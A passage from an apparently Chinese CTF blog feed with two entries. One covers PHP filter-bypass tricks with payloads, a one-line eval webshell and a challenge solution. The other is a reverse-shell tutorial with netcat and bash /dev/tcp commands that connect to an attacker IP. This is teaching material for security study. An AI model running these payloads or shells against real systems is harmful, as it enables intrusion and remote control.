class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br><br><br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>如果比较的是数组的话，直接返回一个0。</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>中<code>file_get_contents(&quot;/flag&quot;)</code>的值是字符串</p><p>payload：<code>key4[]=1</code></p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p><code>is_numeric</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!<span class="hljs-built_in">is_numeric</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span> &gt; <span class="hljs-number">2023</span><br></code></pre></td></tr></table></figure><p>payload：<code>key5=2024%00</code></p><p>我们可以变成判断条件绕过 即 <code>key5=2024|2024</code></p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>GET接收num传参，num要小于2020，加1之后要大于2021，否则要么die，要么还是die<br>随后查询intval()函数的使用方式，如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值；但是如果先科学计数法+数字，此时会先将科学计数法变为正常的数再进行加法运算，之后才传入intval()进行转换。</p><p>注意：该方法只有php5才生效?num&#x3D;2e4</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="_过滤"></a>_过滤</h3><p>PHP中<code>_</code>可以用<code>[</code>替代</p><p><img src="/2023/10/28/PHP_tricks/image-20231028151956001.png" alt="image-20231028151956001"></p><h3 id="pre-match"><a href="#pre-match" class="headerlink" title="pre_match"></a>pre_match</h3><p>函数处理的字符长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jiuzhe</span>(<span class="hljs-params"><span class="hljs-variable">$xdmtql</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>);<br>&#125;<br><br><span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">jiuzhe</span>(<span class="hljs-variable">$xdmtql</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;*******&#125;&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true .swp file?&#x27;</span>;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nijilenijile&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pre_match</code>函数处理的字符长度有限，如果超过这个长度就会返回<code>false</code>也就是没有匹配到。利用利用下面的代码进行回溯，让<code>pre_match</code>函数报错，绕过该函数，这样<code>strpos</code>函数就可以顺利的匹配到我们的字符串从而输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;xdmtql&quot;</span>: <span class="hljs-string">&quot;sys nb&quot;</span> + <span class="hljs-string">&quot;aaaaa&quot;</span> * <span class="hljs-number">1000000</span>&#125;<br>res = requests.post(<span class="hljs-string">&#x27;http://4d3f6fc4-7a26-4ce2-b6b6-238a5f6c5f65.www.polarctf.com:8090/&#x27;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.content)<br></code></pre></td></tr></table></figure><p><code>$_GET[&#39;k_e_y&#39;] !==&#39;123&#39; &amp;&amp; preg_match(&#39;/^123$/&#39;,$GET[&#39;k_e_y&#39;])</code></p><p>可以使用%0a(换行符截断)来进行绕过完整</p><p>payload：get方法：<code>?k+e+y=123%0a</code></p><h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>可以用<span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br><br> <br><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#前提是开启配置参数short_open_tags=on</span><br><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>  等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;   <span class="hljs-comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="hljs-comment">#不需要修改参数开关，但是只能在7.0以下可用。</span><br><br></code></pre></td></tr></table></figure><h3 id="php序列化的字母标识"><a href="#php序列化的字母标识" class="headerlink" title="php序列化的字母标识"></a>php序列化的字母标识</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">NULL</span></span><br></code></pre></td></tr></table></figure><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct <span class="hljs-comment">//当一个对象创建时被调用</span><br>__destruct <span class="hljs-comment">//当一个对象销毁时被调用</span><br>__toString <span class="hljs-comment">//当一个对象被当作一个字符串被调用</span><br><span class="hljs-title function_ invoke__">__wakeup</span>() <span class="hljs-comment">//执行unserialize()时，先会调用这个函数</span><br><span class="hljs-title function_ invoke__">__sleep</span>() <span class="hljs-comment">//执行serialize()时，先会调用这个函数</span><br><span class="hljs-title function_ invoke__">__destruct</span>() <span class="hljs-comment">//对象被销毁时触发</span><br><span class="hljs-title function_ invoke__">__call</span>() <span class="hljs-comment">//对不存在的方法或者不可访问的方法进行调用就触发</span><br><span class="hljs-title function_ invoke__">__callStatic</span>() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br><span class="hljs-title function_ invoke__">__get</span>() <span class="hljs-comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="hljs-title function_ invoke__">__set</span>() <span class="hljs-comment">//在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="hljs-title function_ invoke__">__isset</span>() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span><br><span class="hljs-title function_ invoke__">__unset</span>() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br><span class="hljs-title function_ invoke__">__toString</span>() <span class="hljs-comment">//把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="hljs-title function_ invoke__">__invoke</span>() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br></code></pre></td></tr></table></figure><h3 id="destruct早一点触发"><a href="#destruct早一点触发" class="headerlink" title="destruct早一点触发"></a>destruct早一点触发</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.去掉序列化尾部 &#125;<br>2.修改序列化数字元素个数<br></code></pre></td></tr></table></figure><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的__destruct(),提前触发反序列化链条。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TEST</span></span>&#123;  <br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$test1</span>=<span class="hljs-string">&quot;11&quot;</span>;  <br> <span class="hljs-keyword">private</span> <span class="hljs-variable">$test2</span>=<span class="hljs-string">&quot;22&quot;</span>;  <br> <span class="hljs-keyword">protected</span> <span class="hljs-variable">$test3</span>=<span class="hljs-string">&quot;33&quot;</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test4</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"> </span>&#123;  <br> <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test1;  <br> &#125;  <br>&#125;  <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">TEST</span>();  <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);  <br><span class="hljs-comment">//O:4:&quot;TEST&quot;:3:&#123;s:5:&quot;test1&quot;;s:2:&quot;11&quot;;s:11:&quot; TEST test2&quot;;s:2:&quot;22&quot;;s:8:&quot; * test3&quot;;s:2:&quot;33&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Geek-Challenge-2023"><a href="#Geek-Challenge-2023" class="headerlink" title="Geek Challenge 2023"></a>Geek Challenge 2023</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>            <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>            <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;再绕最后一步吧&quot;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好哩，快拿到flag啦&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嘿嘿嘿，你别急啊&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">?syc=Welcome to GEEK <span class="hljs-number">2023</span>!%0a&amp;lover=<span class="hljs-number">2</span>e4<br><br><span class="hljs-string">qw[]</span>=<span class="hljs-number">10932435112</span>&amp;yxx[]=aaroZmOk&amp;SYC[GEEK.<span class="hljs-number">2023</span>=Happy to see you!<br>其中<br><span class="hljs-string">qw[]</span>=0e07766915004133176347055865026311692244&amp;yxx[]=0e66507019969427134894567494305185566735<br><span class="hljs-string">qw[]</span>=<span class="hljs-number">10932435112</span>&amp;yxx[]=aaroZmOk<br>都可以<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell</title>
    <link href="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2023/10/28/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。</p><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>那么为什么要用反弹shell呢？</p><p>反弹shell通常适用于如下几种情况：</p><ul><li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li><li>目标机端口被占用。</li><li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li><li>……</li></ul><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p><h2 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss">wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br>tar -xvzf netcat<span class="hljs-number">-0.7</span><span class="hljs-number">.1</span>.tar.gz<br>./configure<br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br><span class="hljs-built_in">make</span> clean<br></code></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netcat</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> -e /bin/bash<br><span class="hljs-comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a>利用Bash反弹shell</h2><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>或<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span><br># bash -i &gt;&amp; <span 